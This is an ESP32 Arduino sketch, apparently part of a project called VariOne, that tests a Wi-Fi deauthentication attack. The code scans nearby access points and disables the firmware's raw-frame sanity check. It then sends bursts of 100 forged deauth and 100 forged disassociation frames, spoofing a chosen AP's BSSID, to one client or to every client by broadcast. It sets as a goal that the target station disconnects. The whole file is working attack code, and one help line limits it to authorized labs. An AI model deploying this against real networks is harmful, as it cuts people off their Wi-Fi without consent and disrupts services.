// P0.5 deauth smoke test for VariOne. Standalone serial-only sketch
// proving the deauth TX path before any main.cpp refactor (PRD §9.6.1,
// CLAUDE.md sensor-first rule). Three tiers:
//   Tier 1: esp_wifi_80211_tx() returns ESP_OK and channel readback
//           matches the selected AP channel for every frame.
//   Tier 2: external RX witness (laptop in monitor mode or 2nd ESP32)
//           confirms frames hit the air on the locked channel.
//   Tier 3: target station disconnects from the AP under attack.
//
// No edits to main.cpp. Mirrors test_wifi_lab.cpp's wrap of the IDF
// raw-frame sanity check. References ESP32 Marauder deauth frame
// structure (study, not copy) per CLAUDE.md.
//
// Serial @ 115200. Commands: h s 0-9 b t c r x.

#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_err.h"

extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
  return 0;
}

struct ApInfo {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  int32_t channel;
  wifi_auth_mode_t enc;
};

static ApInfo aps[20];
static int apCount = 0;
static int selectedAp = -1;
static uint8_t targetClient[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static bool clientLocked = false;
static uint16_t seqNum = 0;

// 26-byte 802.11 deauth frame template.
// fc=0xC0 (deauth) / 0xA0 (disassoc), duration, addr1=dst, addr2=bssid,
// addr3=bssid, seq, reason=0x07 (class 3 frame received from
// nonassociated station — Marauder-equivalent).
static uint8_t deauthFrame[26] = {
  0xC0, 0x00,                         // frame control: deauth
  0x3A, 0x01,                         // duration (matches firmware path)
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // addr1 dst
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr2 bssid (filled per-tx)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr3 bssid (filled per-tx)
  0x00, 0x00,                         // seq ctrl
  0x07, 0x00                          // reason code
};

enum TxProfile {
  TX_STA_LEGACY_FALSE,
  TX_STA_FIRMWARE_TRUE,
  TX_APSTA_PORTAL_TRUE
};

static void macToString(const uint8_t* mac, char* out, size_t n) {
  snprintf(out, n, "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void printHelp() {
  Serial.println();
  Serial.println("[DEAUTH-TEST] commands:");
  Serial.println("  h       help");
  Serial.println("  s       scan APs");
  Serial.println("  0-9     select AP index from last scan");
  Serial.println("  b       broadcast mode (addr1 = FF:FF:FF:FF:FF:FF)");
  Serial.println("  c HEX   client lock, e.g. c AA:BB:CC:DD:EE:FF");
  Serial.println("  t       Tier 1+2 burst across STA false, STA true, AP_STA true TX paths");
  Serial.println("  r       repeat last burst (Tier 3 phone-disconnect proof)");
  Serial.println("  x       stop WiFi");
  Serial.println("[DEAUTH-TEST] use only inside an authorized lab environment.");
}

static const char* txProfileName(TxProfile profile) {
  switch (profile) {
    case TX_STA_LEGACY_FALSE: return "STA en_sys_seq=false";
    case TX_STA_FIRMWARE_TRUE: return "STA en_sys_seq=true";
    case TX_APSTA_PORTAL_TRUE: return "AP_STA WIFI_IF_AP en_sys_seq=true";
  }
  return "unknown";
}

static void doScan() {
  Serial.println("[DEAUTH-TEST] scanning...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(50);
  int n = WiFi.scanNetworks(false, true, false, 250);
  apCount = (n < 0) ? 0 : (n > 20 ? 20 : n);
  for (int i = 0; i < apCount; ++i) {
    aps[i].ssid = WiFi.SSID(i);
    memcpy(aps[i].bssid, WiFi.BSSID(i), 6);
    aps[i].rssi = WiFi.RSSI(i);
    aps[i].channel = WiFi.channel(i);
    aps[i].enc = WiFi.encryptionType(i);
    char m[20];
    macToString(aps[i].bssid, m, sizeof(m));
    Serial.printf("[%d] %-20s %s ch=%ld rssi=%ld enc=%d\n",
                  i, aps[i].ssid.c_str(), m,
                  (long)aps[i].channel, (long)aps[i].rssi, (int)aps[i].enc);
  }
  WiFi.scanDelete();
  Serial.printf("[DEAUTH-TEST] scan done, %d APs\n", apCount);
}

static bool selectAp(int idx) {
  if (idx < 0 || idx >= apCount) {
    Serial.println("[DEAUTH-TEST] bad index");
    return false;
  }
  selectedAp = idx;
  char m[20];
  macToString(aps[idx].bssid, m, sizeof(m));
  Serial.printf("[DEAUTH-TEST] selected [%d] %s ch=%ld\n",
                idx, m, (long)aps[idx].channel);
  return true;
}

static void parseClient(const char* hex) {
  unsigned int b[6] = {0};
  if (sscanf(hex, "%x:%x:%x:%x:%x:%x",
             &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) {
    Serial.println("[DEAUTH-TEST] bad MAC format");
    return;
  }
  for (int i = 0; i < 6; ++i) targetClient[i] = (uint8_t)b[i];
  clientLocked = true;
  char m[20];
  macToString(targetClient, m, sizeof(m));
  Serial.printf("[DEAUTH-TEST] client locked: %s\n", m);
}

static void setBroadcast() {
  for (int i = 0; i < 6; ++i) targetClient[i] = 0xFF;
  clientLocked = false;
  Serial.println("[DEAUTH-TEST] addr1 = broadcast FF:FF:FF:FF:FF:FF");
}

static void bindChannel(uint8_t ch) {
  esp_err_t e = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  Serial.printf("[DEAUTH-TEST] esp_wifi_set_channel(%u) -> 0x%X\n", ch, e);
}

static void fillMgmtFrame(uint8_t subtype, const uint8_t* addr1, const uint8_t* bssid,
                          uint16_t reason, bool firmwareSeq) {
  deauthFrame[0] = subtype;
  deauthFrame[1] = 0x00;
  deauthFrame[2] = 0x3A;
  deauthFrame[3] = 0x01;
  memcpy(&deauthFrame[4], addr1, 6);
  memcpy(&deauthFrame[10], bssid, 6);
  memcpy(&deauthFrame[16], bssid, 6);
  if (firmwareSeq) {
    seqNum = (seqNum + 1) & 0x0FFF;
    uint16_t seqCtrl = seqNum << 4;
    deauthFrame[22] = seqCtrl & 0xFF;
    deauthFrame[23] = (seqCtrl >> 8) & 0xFF;
  } else {
    deauthFrame[22] = 0x00;
    deauthFrame[23] = 0x00;
  }
  deauthFrame[24] = reason & 0xFF;
  deauthFrame[25] = (reason >> 8) & 0xFF;
}

static void setupTxProfile(TxProfile profile, uint8_t ch) {
  esp_wifi_set_promiscuous(false);
  if (profile == TX_APSTA_PORTAL_TRUE) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP("VariOne-DeauthTest", nullptr, ch, true);
    WiFi.disconnect(false, true);
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, true);
  }
  delay(50);
  esp_wifi_set_promiscuous(true);
  bindChannel(ch);
}

static esp_err_t txOne(TxProfile profile, uint8_t subtype, const ApInfo& ap) {
  bool enSysSeq = (profile != TX_STA_LEGACY_FALSE);
  uint16_t reason = (subtype == 0xC0) ? 7 : 8;
  fillMgmtFrame(subtype, targetClient, ap.bssid, reason, enSysSeq);
  if (profile == TX_APSTA_PORTAL_TRUE) {
    esp_err_t r = esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), true);
    if (r != ESP_OK) {
      r = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), true);
    }
    return r;
  }
  return esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), enSysSeq);
}

static bool runTxProfile(TxProfile profile, const ApInfo& ap) {
  uint8_t ch = (uint8_t)ap.channel;
  uint32_t okDeauth = 0, okDisassoc = 0, fail = 0;
  uint32_t chanMismatch = 0;
  const int N = 100;

  setupTxProfile(profile, ch);
  Serial.printf("[DEAUTH-TEST] profile: %s\n", txProfileName(profile));

  for (int i = 0; i < N; ++i) {
    esp_err_t e = txOne(profile, 0xC0, ap);
    uint8_t prim = 0; wifi_second_chan_t sec;
    esp_wifi_get_channel(&prim, &sec);
    if (e == ESP_OK) okDeauth++; else fail++;
    if (prim != ch) chanMismatch++;
    if (i % 20 == 0) {
      Serial.printf("  deauth #%d esp_err=0x%X chan=%u (want %u)\n",
                    i, e, prim, ch);
    }
    delay(2);
  }
  for (int i = 0; i < N; ++i) {
    esp_err_t e = txOne(profile, 0xA0, ap);
    uint8_t prim = 0; wifi_second_chan_t sec;
    esp_wifi_get_channel(&prim, &sec);
    if (e == ESP_OK) okDisassoc++; else fail++;
    if (prim != ch) chanMismatch++;
    if (i % 20 == 0) {
      Serial.printf("  disassoc #%d esp_err=0x%X chan=%u (want %u)\n",
                    i, e, prim, ch);
    }
    delay(2);
  }

  esp_wifi_set_promiscuous(false);
  if (profile == TX_APSTA_PORTAL_TRUE) WiFi.softAPdisconnect(true);

  Serial.println("[DEAUTH-TEST] burst summary:");
  Serial.printf("  profile         : %s\n", txProfileName(profile));
  Serial.printf("  deauth   ESP_OK : %u/%d\n", okDeauth, N);
  Serial.printf("  disassoc ESP_OK : %u/%d\n", okDisassoc, N);
  Serial.printf("  fails           : %u\n", fail);
  Serial.printf("  chan mismatch   : %u\n", chanMismatch);
  bool pass = okDeauth == (uint32_t)N && okDisassoc == (uint32_t)N && chanMismatch == 0;
  Serial.printf("  PASS profile    : %s\n", pass ? "YES" : "NO");
  return pass;
}

static void burst() {
  if (selectedAp < 0) {
    Serial.println("[DEAUTH-TEST] no AP selected; run s then 0-9 first");
    return;
  }
  const ApInfo& ap = aps[selectedAp];
  Serial.println("[DEAUTH-TEST] Tier 1+2 burst: 100 deauth + 100 disassoc per TX path");

  bool passStaFalse = runTxProfile(TX_STA_LEGACY_FALSE, ap);
  bool passStaTrue = runTxProfile(TX_STA_FIRMWARE_TRUE, ap);
  bool passApStaTrue = runTxProfile(TX_APSTA_PORTAL_TRUE, ap);

  Serial.println("[DEAUTH-TEST] Tier 1 all-profile summary:");
  Serial.printf("  STA false       : %s\n", passStaFalse ? "PASS" : "FAIL");
  Serial.printf("  STA true        : %s\n", passStaTrue ? "PASS" : "FAIL");
  Serial.printf("  AP_STA AP true  : %s\n", passApStaTrue ? "PASS" : "FAIL");
  Serial.printf("  PASS Tier 1     : %s\n",
                (passStaFalse && passStaTrue && passApStaTrue) ? "YES" : "NO");
  Serial.println("[DEAUTH-TEST] Tier 2: confirm frames in laptop monitor / 2nd ESP32 capture.");
  Serial.println("[DEAUTH-TEST] Tier 3: confirm target station disconnects (run again with 'r').");
}

void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println();
  Serial.println("[DEAUTH-TEST] VariOne P0.5 deauth smoke test");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  printHelp();
}

void loop() {
  if (!Serial.available()) { delay(10); return; }
  String line = Serial.readStringUntil('\n');
  line.trim();
  if (line.length() == 0) return;
  char c0 = line[0];
  if (c0 == 'h') printHelp();
  else if (c0 == 's') doScan();
  else if (c0 >= '0' && c0 <= '9') selectAp(c0 - '0');
  else if (c0 == 'b') setBroadcast();
  else if (c0 == 'c') {
    int sp = line.indexOf(' ');
    if (sp > 0) parseClient(line.c_str() + sp + 1);
    else Serial.println("[DEAUTH-TEST] usage: c AA:BB:CC:DD:EE:FF");
  }
  else if (c0 == 't' || c0 == 'r') burst();
  else if (c0 == 'x') { WiFi.mode(WIFI_OFF); Serial.println("[DEAUTH-TEST] WiFi off"); }
  else Serial.println("[DEAUTH-TEST] unknown; h for help");
}
